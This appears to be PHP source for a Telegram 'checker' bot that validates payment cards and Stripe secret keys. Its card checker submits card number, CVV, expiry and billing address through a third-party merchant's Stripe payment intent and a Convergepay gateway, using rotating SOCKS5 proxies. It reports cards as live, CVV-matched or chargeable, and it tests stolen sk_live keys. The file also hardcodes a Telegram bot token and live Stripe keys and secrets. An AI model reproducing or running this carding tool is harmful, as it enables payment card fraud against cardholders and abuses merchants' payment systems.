...
////////////////=============[Made with ❤️ by Sarcehkr]===============////////////////

///https://api.telegram.org/bot<token>/setwebhook?url=<url>

$botToken = "5451605079:AAG-aHhA4QtKrMWVO44z8oVWTJ6wZkg5dPc"; // Enter ur bot token
...
sendMessage($chatId, "<b>Hello there!!%0AType /help to know all my commands!!%0A%0ABot Made by Sarcehkr @SarceMosra</b>");
}

//////////=========[Help Command]=========//////////

elseif ((strpos($message, "!help") === 0)||(strpos($message, "/help") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u> To know ur info%0A%0A<b>Bot Made by Sarcehkr </b>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by Sarcehkr </b>");
}
...
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by  Sarcehkr</b>');
}
curl_close($ch);
...
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.bintwinning.org/api/stripe/payment-intent-secret');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.bintwinning.org',
'method: POST',
'path: /api/stripe/payment-intent-secret HTTP/1.1',
'scheme: https',
'accept: */*',
'accept-language: es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.bintwinning.org',
'referer: https://www.bintwinning.org/',
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50');
...
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3LZI3sJ7SuHQfYVE0DgMLXjX/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
...
'method: POST',
'path: /v1/payment_intents/pi_3LZI3sJ7SuHQfYVE0DgMLXjX/confirm',
'scheme: https',
...
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; LM-K200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'user-agent: '.$ua.'',
'x-requested-with: XMLHttpRequest',

   ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][address][line1]='.$street.'&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]='.$city.'&payment_method_data[billing_details][address][state]='.$state.'&payment_method_data[billing_details][address][postal_code]='.$zip.'&payment_method_data[billing_details][address][country]=MX&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=0ef1ce7e-45fb-47a9-8966-50674480cd4bfbf625&payment_method_data[muid]=4e6427a9-7e07-45b9-9874-c03da4221b801444b1&payment_method_data[sid]=f85a0b68-bc2c-4105-8e46-eeb3e42b0cb31accd7&payment_method_data[payment_user_agent]=stripe.js%2F1f3998f34%3B+stripe-js-v3%2F1f3998f34&payment_method_data[time_on_page]=36284&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51AKkHXJ7SuHQfYVEX6zZEzlUObvoL8SxDSnf9cze3NTkrDEMEson8SQ3keLlzyjsxgyqZibT15BNnUhQ5lnDnND2007e0ee73t&client_secret=pi_3LZI3sJ7SuHQfYVE0DgMLXjX_secret_BAee8XkV9WrciSy4BD0JAJXOT');
...
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Sarcehkr</b>');
}
...
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED [M][U] ★ 』 %0A<u>Chargeable::</u> <b>『 ★  Maybe Yes ★ 』</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Sarcehkr</b>');
}
elseif($cvvres == "M"){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED [M]['.$avsres.'] ★ 』 %0A<u>Chargeable::</u> <b>『 ★ Chargeable: '.$chStatus.' ★ 』</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Sarcehkr</b>');
}
elseif($cvvres == "N"){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ LIVE CCN [N]['.$avsres.'] ★ 』%0A<u>Chargeable::</u> <b>『 ★ No ★ 』</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Sarcehkr</b>');
}
elseif (strpos($result9, '"success":true')){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Charged CVV ★ 』%0A<u>Chargeable::</u> <b>『 ★ Yes ★ 』</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Sarcehkr</b>');
}
elseif(!$result9){
...
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ['.$cvvres.']['.$avsres.'] ★ 』%0A<u>Mensaje::</u> <b>『 ★ Msg: '.$msg.' ★ 』[Maybe api dead]</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by Sarcehkr</b>');
}
curl_close($ch);
}
...
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by Sarcehkr </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by Sarcehkr </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by Sarcehkr </b>");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by Sarcehkr </b>");
}}
